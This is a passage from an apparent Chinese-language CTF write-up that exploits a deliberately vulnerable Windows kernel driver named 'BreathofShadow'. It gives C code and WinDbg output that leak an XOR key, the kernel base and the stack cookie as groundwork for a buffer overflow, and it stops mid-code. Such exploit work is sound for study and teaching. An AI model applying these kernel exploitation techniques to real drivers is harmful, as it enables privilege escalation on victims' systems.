<p>gs register主要用於存取與當前 CPU 或Thread相關的數據結構</p>
<p>KPCR 的主要目的是為每個CPU維護專屬的處理器控制數據，並在多CPU系統中進行高效管理。KPCR 位於kernel space，提供一些關鍵資訊供內核、驅動程式以及低層次的系統組件使用</p>
<p><code>KPCR represents the Kernel Processor Control Region. The KPCR contains per-CPU information which is shared by the kernel and the HAL. There are as many KPCR in the system as there are CPUs.</code></p>
<h3 id="debug-and-install-windows-driver"><a href="#debug-and-install-windows-driver" class="headerlink" title="debug and install windows driver"></a>debug and install windows driver</h3><p>參考上面的如何attach kernel 跟 install kernel<br>總之就先開啟testing mode<br><img src="https://hackmd.io/_uploads/HyF4lNxB1x.png" alt="image"></p>
<p>之後掛上去kernel driver<br><img src="https://hackmd.io/_uploads/SJHdl4lSke.png" alt="image"></p>
<p>這邊再用windbg時候沒有顯示我們install上去的kernel driver<br>我就試著加載了一下symbol就看到了</p>
<p><img src="https://hackmd.io/_uploads/B1yYU2AtJg.png" alt="image"></p>
<h3 id="開始-exploit-觀察"><a href="#開始-exploit-觀察" class="headerlink" title="開始 exploit - 觀察"></a>開始 exploit - 觀察</h3><p>真的得先熟悉windows 32 API怎麼用QQ<br>寫腳本寫的好卡</p>
<p>先來寫跟 driver 互動的腳本，並觀察他做了啥<br>下個 breakpoint 在 ioctl handler 內</p>
<p><img src="https://hackmd.io/_uploads/HkLtoh0Kke.png" alt="image"></p>
<p>下在 memcpy 上</p>
<p>先跑這份</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeVioctlCode 0x9C40240B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeviceName <span class="string">L&quot;\\\\.\\BreathofShadow&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* byteData = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08zx  &quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, byteData[i + j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; |&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> c = byteData[i + j];</span><br><span class="line">                <span class="keyword">if</span> (c &gt;= <span class="number">32</span> &amp;&amp; c &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[X] Failed to open device. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Success open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* inputbuf = (<span class="type">size_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[X] Memory allocation failed\n&quot;</span>);</span><br><span class="line">        CloseHandle(hDevice);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(inputbuf, <span class="number">0x81</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> outputbuf[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    BOOL result = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        inputbuf,</span><br><span class="line">        <span class="number">0x100</span>,</span><br><span class="line">        outputbuf,</span><br><span class="line">        <span class="keyword">sizeof</span>(outputbuf),</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>理論上第一個 memcpy 時<br><code>memcpy(Dst, InputBuffer, (unsigned int)InputBufferLength);</code></p>
<table>
<thead>
<tr>
<th>register</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>r8d</td>
<td>InputBufferLength</td>
</tr>
<tr>
<td>rdx</td>
<td>InputBuffer</td>
</tr>
<tr>
<td>rcx</td>
<td>Dst</td>
</tr>
</tbody></table>
<p><img src="https://hackmd.io/_uploads/SJTjeaAtJg.png" alt="image"></p>
<p>通過 windbg 觀察可以發現卡在第一個斷點<br>查看 register 值，可以發現 inputbuffer 有 0x81</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">BreathofShadow+0x506f:</span><br><span class="line">fffff800`1340506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`13401180)</span><br><span class="line"></span><br><span class="line">kd&gt; r r8</span><br><span class="line">r8=0000000000000100</span><br><span class="line">kd&gt; dq rdx</span><br><span class="line">00000000`00aa1420  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1430  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1440  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1450  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1460  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1470  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1480  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1490  81818181`81818181 81818181`81818181</span><br><span class="line">kd&gt; dq rcx</span><br><span class="line">ffff8104`0cf63540  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf63550  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf63560  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf63570  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf63580  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf63590  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf635a0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0cf635b0  00000000`00000000 00000000`00000000</span><br></pre></td></tr></table></figure>

<p>繼續 g 一下會卡在第二個斷點，也就是第二個 memcpy<br><code>memcpy(InputBuffer, Dst, OutputBufferLength);</code><br><img src="https://hackmd.io/_uploads/H1idz60tkl.png" alt="image"></p>
<table>
<thead>
<tr>
<th>register</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>r8d</td>
<td>OutputBufferLength</td>
</tr>
<tr>
<td>rdx</td>
<td>Dst</td>
</tr>
<tr>
<td>rcx</td>
<td>InputBuffer</td>
</tr>
</tbody></table>
<p>看 windbg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">BreathofShadow+0x50ba:</span><br><span class="line">fffff800`134050ba e8c1c0ffff      call    BreathofShadow+0x1180 (fffff800`13401180)</span><br><span class="line"></span><br><span class="line">kd&gt; r r8</span><br><span class="line">r8=0000000000000100</span><br><span class="line">kd&gt; dq rcx</span><br><span class="line">00000000`00aa1420  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1430  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1440  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1450  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1460  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1470  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1480  81818181`81818181 81818181`81818181</span><br><span class="line">00000000`00aa1490  81818181`81818181 81818181`81818181</span><br><span class="line">kd&gt; dq rdx</span><br><span class="line">ffff8104`0cf63540  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf63550  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf63560  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf63570  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf63580  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf63590  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf635a0  f41b3021`93062445 f41b3021`93062445</span><br><span class="line">ffff8104`0cf635b0  f41b3021`93062445 f41b3021`93062445</span><br></pre></td></tr></table></figure>

<p>現在 rdx 是 Dst，也就是被 xor 過的值<br>那總之第一步先來 xor key</p>
<h3 id="Xor-Key"><a href="#Xor-Key" class="headerlink" title="Xor Key"></a>Xor Key</h3><p>先上腳本，這樣就可以 leakkey 了，先把一串 0x81 丟進去，他會丟出 xor 結果，xor 回來就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeVioctlCode 0x9C40240B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeviceName <span class="string">L&quot;\\\\.\\BreathofShadow&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* byteData = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08zx  &quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, byteData[i + j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; |&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> c = byteData[i + j];</span><br><span class="line">                <span class="keyword">if</span> (c &gt;= <span class="number">32</span> &amp;&amp; c &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[X] Failed to open device. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Success open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> inputbuf = <span class="number">0x8181818181818181</span>;</span><br><span class="line">    <span class="type">size_t</span> KEY = <span class="number">0x0</span>;</span><br><span class="line">    <span class="type">char</span> outputbuf[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    BOOL result = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        &amp;inputbuf,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] IOCTL command sent successfully\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakData: 0x%llx\n&quot;</span>,inputbuf);</span><br><span class="line">        KEY = <span class="number">0x8181818181818181</span> ^ inputbuf;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakKey: 0x%llx\n&quot;</span>,KEY);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to send IOCTL command. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功畫面<br><img src="https://hackmd.io/_uploads/BkA7t60YJg.png" alt="image"></p>
<h3 id="leak-kernel-base-and-stack-cookie"><a href="#leak-kernel-base-and-stack-cookie" class="headerlink" title="leak kernel base and stack cookie"></a>leak kernel base and stack cookie</h3><p>接下來要 leak kernel base 來用上面的 gadget，以及要打 Buffer overflow 蓋 ret address 需要 leak stack cookie，在 overflow 時蓋回去才不會 crash，這邊可以用上述提到的 information leak 洞</p>
<p>先看 kernel base 在哪</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; lm m nt</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffff800`7ce00000 fffff800`7e24f000   nt         (pdb symbols)          c:\symbols\ntkrnlmp.pdb\953A8DE880B0818C32DA2DEC1D79C2D91\ntkrnlmp.pdb</span><br><span class="line"></span><br><span class="line">kd&gt; dq rdx L50</span><br><span class="line">ffff8104`0d392540  f41b3021`93062445 00000000`00000000</span><br><span class="line">ffff8104`0d392550  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392560  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392570  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392580  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392590  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d3925a0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d3925b0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d3925c0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d3925d0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d3925e0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d3925f0  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392600  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392610  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392620  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392630  00000000`00000000 00000000`00000000</span><br><span class="line">ffff8104`0d392640  ffffce78`298e4f82 fffff800`7d97b3c9</span><br><span class="line">ffff8104`0d392650  00000000`00000001 00000000`00000000</span><br></pre></td></tr></table></figure>
<p>從我們印出的位置開始看，可以看到 <code>ffff8104 0d392648</code> 上有 nt kernel base (stack_ptr + 0x108)<br>扣掉 offset <code>0xb7b3c9</code> 就是 kernel base 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeVioctlCode 0x9C40240B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeviceName <span class="string">L&quot;\\\\.\\BreathofShadow&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* byteData = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08zx  &quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, byteData[i + j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; |&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> c = byteData[i + j];</span><br><span class="line">                <span class="keyword">if</span> (c &gt;= <span class="number">32</span> &amp;&amp; c &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, 